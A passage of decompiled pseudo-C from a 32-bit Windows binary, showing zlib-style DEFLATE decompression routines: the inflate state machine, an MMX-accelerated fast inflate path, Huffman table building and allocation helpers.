              v124 = *(_DWORD *)(v4 + 80);
              Src = v5;
              v120 = *(_DWORD *)(v124 + 4 * (v7 & (v123 - 1)));
              Size = v120;
              if ( BYTE1(v120) <= v9 )
                goto LABEL_244;
            }
            goto LABEL_310;
          }
LABEL_244:
          if ( (v120 & 0xF0) == 0 )
          {
            v169 = v120;
            Size = *(_DWORD *)(*(_DWORD *)(v4 + 80)
                             + 4 * (HIWORD(Size) + ((v7 & ((1 << (BYTE1(v120) + v120)) - 1)) >> SBYTE1(v120))));
            if ( BYTE1(v120) + (unsigned int)BYTE1(Size) > v9 )
            {
              while ( v180 )
              {
                v125 = *v5 << v9;
                --v180;
                ++v5;
                v7 += v125;
                v9 += 8;
                Src = v5;
                Size = *(_DWORD *)(*(_DWORD *)(v4 + 80)
                                 + 4 * (HIWORD(v169) + ((v7 & ((1 << (BYTE1(v169) + v169)) - 1)) >> SBYTE1(v169))));
                if ( BYTE1(v169) + (unsigned int)BYTE1(Size) <= v9 )
                  goto LABEL_248;
              }
              goto LABEL_310;
            }
LABEL_248:
            v120 = Size;
            v7 >>= SBYTE1(v169);
            v9 -= BYTE1(v169);
            *(_DWORD *)(v4 + 7108) += BYTE1(v169);
          }
          *(_DWORD *)(v4 + 7108) += BYTE1(v120);
          v7 >>= SBYTE1(v120);
          v9 -= BYTE1(v120);
          if ( (v120 & 0x40) != 0 )
          {
            a3[6] = (int)"invalid distance code";
            goto LABEL_301;
          }
          *(_DWORD *)(v4 + 68) = HIWORD(v120);
          *(_DWORD *)(v4 + 72) = v120 & 0xF;
          *(_DWORD *)v4 = 23;
LABEL_252:
          v126 = *(_DWORD *)(v4 + 72);
          if ( v126 )
          {
            if ( v9 < v126 )
            {
              while ( v180 )
              {
                v127 = *v5;
                --v180;
                v128 = v127 << v9;
                ++v5;
                v9 += 8;
                Src = v5;
                v7 += v128;
                if ( v9 >= *(_DWORD *)(v4 + 72) )
                  goto LABEL_256;
              }
              goto LABEL_310;
            }
LABEL_256:
            v129 = *(_DWORD *)(v4 + 72);
            v9 -= v129;
            *(_DWORD *)(v4 + 68) += v7 & ((1 << v129) - 1);
            v7 >>= v129;
            *(_DWORD *)(v4 + 7108) += v129;
          }
          *(_DWORD *)v4 = 24;
LABEL_258:
          if ( !v177 )
            goto LABEL_310;
          v130 = *(_DWORD *)(v4 + 68);
          if ( v130 <= v171 - v177 )
          {
            v136 = &v175[-v130];
            v133 = *(_DWORD *)(v4 + 64);
            v164 = (int)v136;
            v170 = v133;
LABEL_269:
            Size = v133;
          }
          else
          {
            v131 = v130 - (v171 - v177);
            Size = v131;
            if ( v131 > *(_DWORD *)(v4 + 44) && *(_DWORD *)(v4 + 7104) )
            {
              a3[6] = (int)"invalid distance too far back";
              goto LABEL_301;
            }
            v132 = *(_DWORD *)(v4 + 48);
            if ( v131 <= v132 )
            {
              v135 = *(_DWORD *)(v4 + 48) + *(_DWORD *)(v4 + 52) - v131;
              v133 = Size;
            }
            else
            {
              v133 = v131 - v132;
              v134 = *(_DWORD *)(v4 + 40) + *(_DWORD *)(v4 + 52);
              Size = v133;
              v135 = v134 - v133;
            }
            v164 = v135;
            v170 = *(_DWORD *)(v4 + 64);
            if ( v133 > v170 )
            {
              v133 = *(_DWORD *)(v4 + 64);
              goto LABEL_269;
            }
          }
          if ( v133 > v177 )
          {
            v133 = v177;
            Size = v177;
          }
          v177 -= v133;
          v137 = v170 - v133;
          v138 = v175;
          *(_DWORD *)(v4 + 64) = v137;
          v139 = v164 - (_DWORD)v175;
          for ( i = v164 - (_DWORD)v175; ; v139 = i )
          {
            *v175 = v138[v139];
            v138 = v175 + 1;
            v108 = Size-- == 1;
            ++v175;
            if ( v108 )
              break;
          }
          if ( !*(_DWORD *)(v4 + 64) )
            *(_DWORD *)v4 = 20;
          goto LABEL_302;
        }
        *(_DWORD *)(v4 + 7108) = -1;
LABEL_231:
        *(_DWORD *)v4 = 11;
        goto LABEL_302;
      case 17:
        goto LABEL_166;
      case 18:
        goto LABEL_177;
      case 19:
        goto LABEL_213;
      case 20:
        goto LABEL_214;
      case 21:
        goto LABEL_235;
      case 22:
        goto LABEL_241;
      case 23:
        goto LABEL_252;
      case 24:
        goto LABEL_258;
      case 25:
        if ( !v177 )
          goto LABEL_310;
        *v175 = *(_BYTE *)(v4 + 64);
        --v177;
        ++v175;
        *(_DWORD *)v4 = 20;
        goto LABEL_302;
      case 26:
        if ( !*(_DWORD *)(v4 + 8) )
          goto LABEL_293;
        if ( v9 >= 0x20 )
          goto LABEL_283;
        do
        {
          if ( !v180 )
            goto LABEL_310;
          v140 = *v5;
          --v180;
          v141 = v140 << v9;
          ++v5;
          v9 += 8;
          Src = v5;
          v7 += v141;
        }
        while ( v9 < 0x20 );
LABEL_283:
        v142 = v171 - v177;
        a3[5] += v171 - v177;
        *(_DWORD *)(v4 + 28) += v142;
        if ( v142 )
        {
          v158 = &v175[-v142];
          v157 = *(_DWORD *)(v4 + 24);
          if ( *(_DWORD *)(v4 + 16) )
            v143 = sub_4030C0(v157, v158, v142);
          else
            v143 = sub_405550(v157, v158, v142);
          v5 = (unsigned __int8 *)Src;
          *(_DWORD *)(v4 + 24) = v143;
          a3[12] = v143;
        }
        v171 = v177;
        v144 = v7;
        if ( !*(_DWORD *)(v4 + 16) )
          v144 = HIBYTE(v7) + ((v7 >> 8) & 0xFF00) + (((v7 << 16) + (v7 & 0xFF00)) << 8);
        if ( v144 != *(_DWORD *)(v4 + 24) )
        {
          a3[6] = (int)"incorrect data check";
          goto LABEL_301;
        }
        v7 = 0;
        v9 = 0;
LABEL_293:
        *(_DWORD *)v4 = 27;
LABEL_294:
        if ( !*(_DWORD *)(v4 + 8) || !*(_DWORD *)(v4 + 16) )
          goto LABEL_307;
        if ( v9 < 0x20 )
        {
          while ( v180 )
          {
            v145 = *v5;
            --v180;
            v146 = v145 << v9;
            ++v5;
            v9 += 8;
            Src = v5;
            v7 += v146;
            if ( v9 >= 0x20 )
              goto LABEL_299;
          }
          goto LABEL_310;
        }
LABEL_299:
        if ( v7 != *(_DWORD *)(v4 + 28) )
        {
          a3[6] = (int)"incorrect length check";
LABEL_301:
          *(_DWORD *)v4 = 29;
LABEL_302:
          v8 = *(_DWORD *)v4;
          if ( *(_DWORD *)v4 > 0x1Eu )
            return -2;
          continue;
        }
        v7 = 0;
        v9 = 0;
LABEL_307:
        *(_DWORD *)v4 = 28;
LABEL_308:
        v166 = 1;
LABEL_310:
        a3[3] = (int)v175;
        v150 = v177;
        *a3 = (int)v5;
        v151 = v180;
        a3[4] = v150;
        a3[1] = v151;
        v108 = *(_DWORD *)(v4 + 40) == 0;
        *(_DWORD *)(v4 + 56) = v7;
        *(_DWORD *)(v4 + 60) = v9;
        if ( v108 && (v171 == a3[4] || *(int *)v4 >= 29 || *(int *)v4 >= 26 && a4 == 4) || !sub_403300(v171, (int)a3) )
        {
          v153 = v159 - a3[1];
          v154 = v171 - a3[4];
          a3[2] += v153;
          a3[5] += v154;
          *(_DWORD *)(v4 + 28) += v154;
          v160 = v153;
          if ( *(_DWORD *)(v4 + 8) && v154 )
          {
            if ( *(_DWORD *)(v4 + 16) )
              v155 = sub_4030C0(*(_DWORD *)(v4 + 24), (_BYTE *)(a3[3] - v154), v154);
            else
              v155 = sub_405550(*(_DWORD *)(v4 + 24), (unsigned __int8 *)(a3[3] - v154), v154);
            *(_DWORD *)(v4 + 24) = v155;
            a3[12] = v155;
          }
          v156 = *(_DWORD *)v4;
          if ( *(_DWORD *)v4 == 19 || (v181 = 0, v156 == 14) )
            v181 = 256;
          a3[11] = *(_DWORD *)(v4 + 60) + v181 + (*(_DWORD *)(v4 + 4) != 0 ? 0x40 : 0) + (v156 != 11 ? 0 : 0x80);
          if ( (v160 || v154) && a4 != 4 )
          {
            return v166;
          }
          else
          {
            result = v166;
            if ( !v166 )
              return -5;
          }
        }
        else
        {
          *(_DWORD *)v4 = 30;
          return -4;
        }
        return result;
      case 27:
        goto LABEL_294;
      case 28:
        goto LABEL_308;
      case 29:
        v166 = -3;
        goto LABEL_310;
      case 30:
        return -4;
      default:
        return -2;
    }
  }
}
// 4034A0: variable 'v5' is possibly undefined
// 432688: using guessed type __int16 word_432688[20];

//----- (00404930) --------------------------------------------------------
int __cdecl sub_404930(_DWORD *a1)
{
  int v1; // eax
  void (__cdecl *v2)(_DWORD, int); // ecx
  int v3; // eax

  if ( !a1 )
    return -2;
  v1 = a1[7];
  if ( !v1 )
    return -2;
  v2 = (void (__cdecl *)(_DWORD, int))a1[9];
  if ( !v2 )
    return -2;
  v3 = *(_DWORD *)(v1 + 52);
  if ( v3 )
    v2(a1[10], v3);
  ((void (__cdecl *)(_DWORD, _DWORD))a1[9])(a1[10], a1[7]);
  a1[7] = 0;
  return 0;
}

//----- (00404980) --------------------------------------------------------
void *__cdecl sub_404980(int a1, int a2, int a3)
{
  return malloc(a3 * a2);
}

//----- (004049A0) --------------------------------------------------------
void __cdecl sub_4049A0(int a1, void *Block)
{
  j___free_base(Block);
}

//----- (00404AC0) --------------------------------------------------------
int *__usercall sub_404AC0@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, int *a3, int a4)
{
  unsigned int v4; // kr00_4
  _DWORD *v5; // edi
  int v6; // edx
  int v7; // ecx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  char *v10; // edx
  unsigned int v11; // ebp
  unsigned int v12; // ebx
  char *v13; // esi
  char *v14; // ecx
  unsigned int v15; // ecx
  int v16; // eax
  char *v17; // edi
  unsigned int v18; // kr04_4
  unsigned int v19; // kr08_4
  unsigned __int16 v30; // ax
  char v31; // cl
  unsigned int i; // eax
  unsigned int v33; // edx
  unsigned __int8 v34; // cl
  unsigned __int8 v35; // ch
  unsigned __int16 v36; // ax
  char v37; // cl
  int v38; // eax
  unsigned __int16 v39; // ax
  char v40; // cl
  unsigned int j; // eax
  unsigned int v42; // edx
  unsigned __int8 v43; // cl
  unsigned __int8 v44; // ch
  unsigned __int16 v45; // ax
  char v46; // cl
  int v47; // eax
  char *v48; // esi
  char v49; // al
  char v50; // dl
  char *v51; // edi
  char *v52; // edi
  char v53; // al
  unsigned int v54; // ecx
  char *v55; // esi
  unsigned int v56; // eax
  unsigned int v57; // ecx
  unsigned int v58; // ecx
  __m64 v59; // mm4
  __m64 v60; // mm3
  __m64 v61; // mm5
  __m64 v62; // mm2
  __m64 v63; // mm7
  __m64 v64; // mm7
  int v65; // eax
  unsigned int v66; // edx
  int v67; // eax
  __m64 v68; // mm7
  __m64 v69; // mm7
  int v70; // eax
  unsigned int k; // eax
  int v72; // eax
  unsigned int v73; // ecx
  char v74; // dl
  char *v75; // esi
  char *v76; // edi
  char *v77; // edi
  char v78; // al
  unsigned int v79; // ecx
  char *v80; // esi
  unsigned int v81; // ecx
  unsigned int v82; // ecx
  const char *v83; // ecx
  int v84; // edx
  int *result; // eax
  int v86; // edx
  int v87; // esi
  unsigned int v88; // ebx
  char *v89; // [esp+4h] [ebp-64h]
  char *v90; // [esp+8h] [ebp-60h]
  unsigned int v91; // [esp+Ch] [ebp-5Ch]
  unsigned int v92; // [esp+10h] [ebp-58h]
  unsigned int v93; // [esp+14h] [ebp-54h]
  unsigned int v94; // [esp+18h] [ebp-50h]
  unsigned int v95; // [esp+1Ch] [ebp-4Ch]
  int v96; // [esp+20h] [ebp-48h]
  unsigned int v97; // [esp+24h] [ebp-44h]
  char *v98; // [esp+28h] [ebp-40h]
  unsigned int v99; // [esp+2Ch] [ebp-3Ch]
  char v100[12]; // [esp+30h] [ebp-38h] BYREF
  char *v101; // [esp+3Ch] [ebp-2Ch]
  char *v102; // [esp+40h] [ebp-28h]
  unsigned int v103; // [esp+44h] [ebp-24h]
  unsigned int v104; // [esp+48h] [ebp-20h]
  char *v105; // [esp+4Ch] [ebp-1Ch]
  char *v106; // [esp+50h] [ebp-18h]
  unsigned int v107; // [esp+54h] [ebp-14h]

  v4 = __readeflags();
  v107 = v4;
  v5 = (_DWORD *)a3[7];
  v6 = *a3 + a3[1] - 11;
  v102 = (char *)*a3;
  v98 = (char *)v6;
  v7 = a3[4];
  v106 = (char *)a3[3];
  v101 = &v106[v7 - a4];
  v97 = (unsigned int)&v106[v7 - 257];
  v95 = v5[19];
  v96 = v5[20];
  v93 = (1 << v5[21]) - 1;
  v94 = (1 << v5[22]) - 1;
  v8 = v5[10];
  v9 = v5[12];
  v10 = (char *)v5[13];
  v104 = v8;
  v103 = v9;
  v105 = v10;
  v11 = v5[14];
  v12 = v5[15];
  v13 = v102;
  v14 = v98;
  if ( v98 > v102 )
  {
    while ( ((unsigned __int8)v13 & 3) != 0 )
    {
      v16 = (unsigned __int8)*v13++;
      v14 = (char *)v12;
      v12 += 8;
      v8 = v16 << (char)v14;
      v11 |= v8;
    }
  }
  else
  {
    v15 = v98 + 11 - v102;
    qmemcpy(v100, v102, v15);
    v8 = 0;
    memset(&v100[v15], 0, 12 - v15);
    v14 = 0;
    v13 = v100;
    v98 = v100;
  }
  v17 = v106;
  while ( dword_508690 != 2 )
  {
    if ( (unsigned int)dword_508690 > 2 )
    {
      while ( 1 )
      {
        if ( (unsigned __int8)v12 <= 0xFu )
        {
          v30 = *(_WORD *)v13;
          v13 += 2;
          v31 = v12;
          LOBYTE(v12) = v12 + 16;
          v11 |= v30 << v31;
        }
        for ( i = *(_DWORD *)(v95 + 4 * (v11 & v93)); ; i = *(_DWORD *)(v95 + 4 * (v33 + (v11 & ((1 << i) - 1)))) )
        {
          LOBYTE(v12) = v12 - BYTE1(i);
          v11 >>= SBYTE1(i);
          if ( !(_BYTE)i )
          {
            *v17++ = BYTE2(i);
            goto LABEL_22;
          }
          v33 = HIWORD(i);
          if ( (i & 0x10) != 0 )
            break;
          if ( (i & 0x40) != 0 )
            goto LABEL_97;
        }
        v34 = i & 0xF;
        if ( (i & 0xF) != 0 )
        {
          if ( (unsigned __int8)v12 < v34 )
          {
            v35 = i & 0xF;
            v36 = *(_WORD *)v13;
            v13 += 2;
            v37 = v12;
            LOBYTE(v12) = v12 + 16;
            v11 |= v36 << v37;
            v34 = v35;
          }
          LOBYTE(v12) = v12 - v34;
          v38 = v11 & ((1 << v34) - 1);
          v11 >>= v34;
          v33 += v38;
        }
        v99 = v33;
        if ( (unsigned __int8)v12 <= 0xFu )
        {
          v39 = *(_WORD *)v13;
          v13 += 2;
          v40 = v12;
          LOBYTE(v12) = v12 + 16;
          v11 |= v39 << v40;
        }
        for ( j = *(_DWORD *)(v96 + 4 * (v11 & v94)); ; j = *(_DWORD *)(v96 + 4 * (v42 + (v11 & ((1 << j) - 1)))) )
        {
          v42 = HIWORD(j);
          LOBYTE(v12) = v12 - BYTE1(j);
          v11 >>= SBYTE1(j);
          if ( (j & 0x10) != 0 )
            break;
          if ( (j & 0x40) != 0 )
            goto LABEL_96;
        }
        v43 = j & 0xF;
        if ( (j & 0xF) != 0 )
        {
          if ( (unsigned __int8)v12 < v43 )
          {
            v44 = j & 0xF;
            v45 = *(_WORD *)v13;
            v13 += 2;
            v46 = v12;
            LOBYTE(v12) = v12 + 16;
            v11 |= v45 << v46;
            v43 = v44;
          }
          LOBYTE(v12) = v12 - v43;
          v47 = v11 & ((1 << v43) - 1);
          v11 >>= v43;
          v42 += v47;
        }
        else if ( v42 == 1 && v101 != v17 )
        {
          v52 = v17 - 1;
          v53 = *v52;
          v52[1] = *v52;
          v52[2] = v53;
          v52[3] = v53;
          v52 += 4;
          memset(v52, v53, v99 - 3);
          v17 = &v52[v99 - 3];
          goto LABEL_22;
        }
        v102 = v13;
        if ( v17 - v101 >= v42 )
        {
          v48 = &v17[-v42];
          *v17 = v17[-v42];
          v49 = v17[-v42 + 1];
          v50 = v17[-v42 + 2];
          v17[1] = v49;
          v17[2] = v50;
          v51 = v17 + 3;
          qmemcpy(v51, v48 + 3, v99 - 3);
          v17 = &v51[v99 - 3];
          v13 = v102;
          goto LABEL_22;
        }
        if ( v104 < v42 )
          goto LABEL_100;
        v54 = v42 + v101 - v17;
        if ( v103 )
        {
          if ( v54 > v103 )
          {
            v55 = &v105[v104 + v103 - v54];
            v57 = v54 - v103;
            v56 = v99;
            if ( v99 > v57 )
            {
              v56 = v99 - v57;
              qmemcpy(v17, v55, v57);
              v17 += v57;
              v55 = v105;
              v58 = v103;
              if ( v56 > v103 )
              {
                v56 -= v103;
                qmemcpy(v17, v105, v103);
                v17 += v58;
                v55 = &v17[-v42];
              }
            }
            goto LABEL_57;
          }
          v55 = &v105[v103 - v54];
          v56 = v99;
          if ( v99 > v54 )
          {
LABEL_56:
            v56 = v99 - v54;
            qmemcpy(v17, v55, v54);
            v17 += v54;
            v55 = &v17[-v42];
          }
        }
        else
        {
          v55 = &v105[v104 - v54];
          v56 = v99;
          if ( v99 > v54 )
            goto LABEL_56;
        }
LABEL_57:
        qmemcpy(v17, v55, v56);
        v17 += v56;
        v13 = v102;
LABEL_22:
        if ( v97 <= (unsigned int)v17 || v98 <= v13 )
          goto LABEL_104;
      }
    }
    v92 = v8;
    v91 = v12;
    v90 = v14;
    v89 = v10;
    v18 = __readeflags();
    __writeeflags(v18 ^ 0x200000);
    v19 = __readeflags();
    if ( v18 == v19 )
      goto LABEL_15;
    _EAX = 0;
    __asm { cpuid }
    if ( _EBX != 1970169159 )
      goto LABEL_15;
    if ( _ECX != 1818588270 )
      goto LABEL_15;
    if ( _EDX != 1231384169 )
      goto LABEL_15;
    _EAX = 1;
    __asm { cpuid }
    if ( ((_EAX >> 8) & 0xF) != 6 )
      goto LABEL_15;
    if ( (_EDX & 0x800000) != 0 )
      dword_508690 = 2;
    else
LABEL_15:
      dword_508690 = 3;
    v10 = v89;
    v14 = v90;
    v12 = v91;
    v8 = v92;
  }
  _m_empty();
  a1 = _mm_cvtsi32_si64(v11);
  v11 = v12;
  v59 = _mm_cvtsi32_si64(v93);
  v60 = v59;
  v61 = _mm_cvtsi32_si64(v94);
  v62 = v61;
  a2.m64_u64 = 0i64;
  v12 = v95;
LABEL_59:
  a1 = _m_psrlq(a1, a2);
  if ( v11 <= 0x20 )
  {
    v63 = _mm_cvtsi32_si64(*(_DWORD *)v13);
    v13 += 4;
    v64 = _m_psllqi(v63, v11);
    v11 += 32;
    a1 = _m_por(a1, v64);
  }
  v65 = _mm_cvtsi64_si32(_m_pand(v59, a1));
  v59 = v60;
  for ( i = *(_DWORD *)(v12 + 4 * v65); ; i = *(_DWORD *)(v12
                                                        + 4 * (v66 + (dword_404A3C[i & 0xF] & _mm_cvtsi64_si32(a1)))) )
  {
    a2 = _mm_cvtsi32_si64(BYTE1(i));
    v11 -= BYTE1(i);
    if ( !(_BYTE)i )
    {
      *v17++ = BYTE2(i);
LABEL_64:
      if ( v97 <= (unsigned int)v17 || v98 <= v13 )
        goto LABEL_104;
      goto LABEL_59;
    }
    v66 = HIWORD(i);
    if ( (i & 0x10) != 0 )
    {
      v67 = i & 0xF;
      if ( v67 )
      {
        a1 = _m_psrlq(a1, a2);
        a2 = _mm_cvtsi32_si64(v67);
        v11 -= v67;
        v66 += dword_404A3C[v67] & _mm_cvtsi64_si32(a1);
      }
      a1 = _m_psrlq(a1, a2);
      if ( v11 <= 0x20 )
      {
        v68 = _mm_cvtsi32_si64(*(_DWORD *)v13);
        v13 += 4;
        v69 = _m_psllqi(v68, v11);
        v11 += 32;
        a1 = _m_por(a1, v69);
      }
      v70 = _mm_cvtsi64_si32(_m_pand(v61, a1));
      v61 = v62;
      for ( k = *(_DWORD *)(v96 + 4 * v70);
            ;
            k = *(_DWORD *)(v96 + 4 * (v12 + (dword_404A3C[k & 0xF] & _mm_cvtsi64_si32(a1)))) )
      {
        v12 = HIWORD(k);
        v11 -= BYTE1(k);
        a2 = _mm_cvtsi32_si64(BYTE1(k));
        if ( (k & 0x10) != 0 )
          break;
        if ( (k & 0x40) != 0 )
        {
LABEL_96:
          v83 = "invalid distance code";
          v84 = 26;
          goto LABEL_101;
        }
        a1 = _m_psrlq(a1, a2);
      }
      v72 = k & 0xF;
      if ( v72 )
      {
        a1 = _m_psrlq(a1, a2);
        a2 = _mm_cvtsi32_si64(v72);
        v11 -= v72;
        v12 += dword_404A3C[v72] & _mm_cvtsi64_si32(a1);
      }
      else if ( v12 == 1 && v101 != v17 )
      {
        v77 = v17 - 1;
        v78 = *v77;
        v77[1] = *v77;
        v77[2] = v78;
        v77[3] = v78;
        v77 += 4;
        memset(v77, v78, v66 - 3);
        v17 = &v77[v66 - 3];
        v12 = v95;
        goto LABEL_64;
      }
      v102 = v13;
      if ( v17 - v101 >= v12 )
      {
        v73 = v66 - 3;
        *v17 = v17[-v12];
        v74 = v17[-v12 + 2];
        v75 = &v17[-v12 + 3];
        v17[1] = v17[-v12 + 1];
        v17[2] = v74;
        v76 = v17 + 3;
        qmemcpy(v76, v75, v73);
        v17 = &v76[v73];
        v13 = v102;
        v12 = v95;
        goto LABEL_64;
      }
      if ( v104 < v12 )
      {
LABEL_100:
        v13 = v102;
        v83 = "invalid distance too far back";
        v84 = 26;
        goto LABEL_101;
      }
      v79 = v12 + v101 - v17;
      if ( v103 )
      {
        if ( v79 > v103 )
        {
          v80 = &v105[v104 + v103 - v79];
          v81 = v79 - v103;
          if ( v66 > v81 )
          {
            v66 -= v81;
            qmemcpy(v17, v80, v81);
            v17 += v81;
            v80 = v105;
            v82 = v103;
            if ( v66 > v103 )
            {
              v66 -= v103;
              qmemcpy(v17, v105, v103);
              v17 += v82;
              v80 = &v17[-v12];
            }
          }
          goto LABEL_95;
        }
        v80 = &v105[v103 - v79];
        if ( v66 > v79 )
          goto LABEL_94;
      }
      else
      {
        v80 = &v105[v104 - v79];
        if ( v66 > v79 )
        {
LABEL_94:
          v66 -= v79;
          qmemcpy(v17, v80, v79);
          v17 += v79;
          v80 = &v17[-v12];
        }
      }
LABEL_95:
      qmemcpy(v17, v80, v66);
      v17 += v66;
      v13 = v102;
      v12 = v95;
      goto LABEL_64;
    }
    if ( (i & 0x40) != 0 )
      break;
    a1 = _m_psrlq(a1, a2);
  }
LABEL_97:
  if ( (i & 0x20) != 0 )
  {
    v83 = 0;
    v84 = 11;
  }
  else
  {
    v83 = "invalid literal/length code";
    v84 = 26;
  }
LABEL_101:
  if ( v83 )
    a3[6] = (int)v83;
  *(_DWORD *)a3[7] = v84;
LABEL_104:
  if ( dword_508690 == 2 )
    v12 = v11;
  result = a3;
  v86 = a3[7];
  v87 = (int)&v13[-(v12 >> 3)];
  v88 = v12 - 8 * (v12 >> 3);
  a3[3] = (int)v17;
  *(_DWORD *)(v86 + 60) = v88;
  if ( v98 == v100 )
  {
    v87 = *a3 + v87 - (_DWORD)v100;
    v98 = (char *)(a3[1] - 11 + *a3);
  }
  *a3 = v87;
  if ( dword_508690 == 2 )
  {
    v11 = _mm_cvtsi64_si32(_m_psrlq(a1, a2));
    _m_empty();
  }
  *(_DWORD *)(v86 + 56) = ((1 << v88) - 1) & v11;
  a3[1] = (int)&v98[-v87 + 11];
  a3[4] = v97 - (_DWORD)v17 + 257;
  __writeeflags(v107);
  return result;
}
// 404A3C: using guessed type int dword_404A3C[];
// 508690: using guessed type int dword_508690;

//----- (00405160) --------------------------------------------------------
int __cdecl sub_405160(int a1, int a2, unsigned int a3, _DWORD **a4, unsigned int *a5, char *a6)
{
  unsigned int i; // eax
  unsigned int v7; // ecx
  unsigned int v8; // eax
  unsigned int j; // ebx
  int v11; // edx
  unsigned int k; // ecx
  int v13; // esi
  unsigned int m; // eax
  __int16 v15; // cx
  unsigned int n; // eax
  char *v17; // eax
  _DWORD *v18; // edx
  unsigned int v19; // eax
  int v20; // edi
  bool v21; // cf
  int v22; // ecx
  int v23; // eax
  int v24; // eax
  int v25; // edx
  _DWORD *v26; // ecx
  unsigned int ii; // eax
  int v29; // esi
  char v30; // dl
  char v31; // cl
  unsigned int v32; // edx
  int v33; // eax
  unsigned __int16 *v34; // esi
  int v35; // eax
  unsigned int v36; // edx
  bool v37; // cf
  _DWORD *v38; // eax
  int v39; // ecx
  unsigned int v40; // edx
  __int16 v41[16]; // [esp+8h] [ebp-7Ch]
  int v42[8]; // [esp+28h] [ebp-5Ch] BYREF
  int v43; // [esp+48h] [ebp-3Ch]
  int v44; // [esp+4Ch] [ebp-38h]
  int v45; // [esp+50h] [ebp-34h]
  int v46; // [esp+54h] [ebp-30h]
  int v47; // [esp+58h] [ebp-2Ch]
  unsigned int v48; // [esp+5Ch] [ebp-28h]
  char *v49; // [esp+60h] [ebp-24h]
  _BYTE *v50; // [esp+64h] [ebp-20h]
  int v51; // [esp+68h] [ebp-1Ch]
  _DWORD *v52; // [esp+6Ch] [ebp-18h]
  unsigned int v53; // [esp+70h] [ebp-14h]
  char *v54; // [esp+74h] [ebp-10h]
  unsigned int v55; // [esp+78h] [ebp-Ch]
  unsigned int v56; // [esp+7Ch] [ebp-8h]
  unsigned int v57; // [esp+80h] [ebp-4h]
  int v58; // [esp+94h] [ebp+10h]
  unsigned __int16 v59; // [esp+94h] [ebp+10h]

  memset(v42, 0, sizeof(v42));
  for ( i = 0; i < a3; ++i )
    ++*((_WORD *)v42 + *(unsigned __int16 *)(a2 + 2 * i));
  v7 = *a5;
  v57 = *a5;
  v8 = 15;
  do
  {
    if ( *((_WORD *)v42 + v8) )
      break;
    --v8;
  }
  while ( v8 );
  v53 = v8;
  if ( v7 > v8 )
  {
    v57 = v8;
    v7 = v8;
  }
  if ( !v8 )
  {
    *(*a4)++ = 320;
    *(*a4)++ = 320;
    *a5 = 1;
    return 0;
  }
  for ( j = 1; j < v8; ++j )
  {
    if ( *((_WORD *)v42 + j) )
      break;
  }
  if ( v7 < j )
    v57 = j;
  v11 = 1;
  for ( k = 1; k <= 0xF; ++k )
  {
    v11 = 2 * v11 - *((unsigned __int16 *)v42 + k);
    if ( v11 < 0 )
      return -1;
  }
  v13 = a1;
  if ( v11 > 0 && (!a1 || v8 != 1) )
    return -1;
  v41[1] = 0;
  for ( m = 1; m < 15; v41[m] = v15 )
  {
    v15 = *(_WORD *)((char *)v42 + m * 2) + v41[m];
    ++m;
  }
  for ( n = 0; n < a3; ++n )
  {
    if ( *(_WORD *)(a2 + 2 * n) )
    {
      *(_WORD *)&a6[2 * (unsigned __int16)v41[*(unsigned __int16 *)(a2 + 2 * n)]++] = n;
      v13 = a1;
    }
  }
  if ( v13 )
  {
    if ( v13 != 1 )
    {
      v49 = (char *)&unk_4329F0;
      v50 = &unk_432A30;
      v51 = -1;
      goto LABEL_34;
    }
    v49 = (char *)&unk_432970 - 514;
    v17 = (char *)&unk_4329B0 - 514;
    v51 = 256;
  }
  else
  {
    v17 = a6;
    v49 = a6;
    v51 = 19;
  }
  v50 = v17;
LABEL_34:
  v18 = *a4;
  v56 = 0;
  v55 = 0;
  v46 = -1;
  v19 = 1 << v57;
  v52 = v18;
  v20 = 1 << v57;
  v47 = 1 << v57;
  v48 = 1 << v57;
  v45 = (1 << v57) - 1;
  if ( v13 == 1 )
  {
    v21 = v19 < 0x354;
    goto LABEL_38;
  }
  if ( v13 == 2 )
  {
    v21 = v19 < 0x250;
LABEL_38:
    if ( !v21 )
      return 1;
  }
  v54 = a6;
  while ( 1 )
  {
    BYTE1(v58) = j - v55;
    v22 = *(unsigned __int16 *)v54;
    if ( v22 >= v51 )
    {
      if ( v22 <= v51 )
      {
        LOBYTE(v58) = 96;
        HIWORD(v58) = 0;
      }
      else
      {
        v23 = 2 * *(unsigned __int16 *)v54;
        LOBYTE(v58) = v50[v23];
        HIWORD(v58) = *(_WORD *)&v49[v23];
      }
    }
    else
    {
      LOBYTE(v58) = 0;
      HIWORD(v58) = *(_WORD *)v54;
    }
    v24 = v20;
    v25 = 1 << (j - v55);
    v44 = v20;
    v26 = &v52[v20 + (v56 >> v55)];
    do
    {
      v26 -= v25;
      v24 -= v25;
      *v26 = v58;
    }
    while ( v24 );
    for ( ii = 1 << (j - 1); (ii & v56) != 0; ii >>= 1 )
      ;
    if ( ii )
      v56 = ii + (v56 & (ii - 1));
    else
      v56 = 0;
    v54 += 2;
    if ( (*((_WORD *)v42 + j))-- != 1 )
      goto LABEL_56;
    if ( j == v53 )
      break;
    j = *(unsigned __int16 *)(a2 + 2 * *(unsigned __int16 *)v54);
LABEL_56:
    if ( j <= v57 || (v29 = v56 & v45, v43 = v56 & v45, (v56 & v45) == v46) )
    {
      v20 = v47;
    }
    else
    {
      v30 = v55;
      if ( !v55 )
      {
        v55 = v57;
        v30 = v57;
      }
      v31 = j - v30;
      v52 += v44;
      v32 = j;
      v33 = 1 << v31;
      if ( j < v53 )
      {
        v34 = (unsigned __int16 *)v42 + j;
        do
        {
          v35 = v33 - *v34;
          if ( v35 <= 0 )
            break;
          ++v32;
          ++v31;
          ++v34;
          v33 = 2 * v35;
        }
        while ( v32 < v53 );
        v29 = v43;
      }
      v20 = 1 << v31;
      v36 = (1 << v31) + v48;
      v47 = 1 << v31;
      v48 = v36;
      if ( a1 == 1 )
      {
        v37 = v36 < 0x354;
      }
      else
      {
        if ( a1 != 2 )
          goto LABEL_70;
        v37 = v36 < 0x250;
      }
      if ( !v37 )
        return 1;
LABEL_70:
      LOBYTE((*a4)[v29]) = v31;
      BYTE1((*a4)[v29]) = v57;
      v38 = *a4;
      v39 = v52 - *a4;
      v46 = v29;
      HIWORD(v38[v29]) = v39;
    }
  }
  if ( v56 )
  {
    LOBYTE(v59) = 64;
    HIBYTE(v59) = j - v55;
    v52[v56] = v59;
  }
  v40 = v57;
  *a4 += v48;
  *a5 = v40;
  return 0;
}

//----- (00405550) --------------------------------------------------------
unsigned int __cdecl sub_405550(unsigned int a1, unsigned __int8 *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  unsigned int v4; // edi
  unsigned int v5; // ecx
  unsigned int v6; // ecx
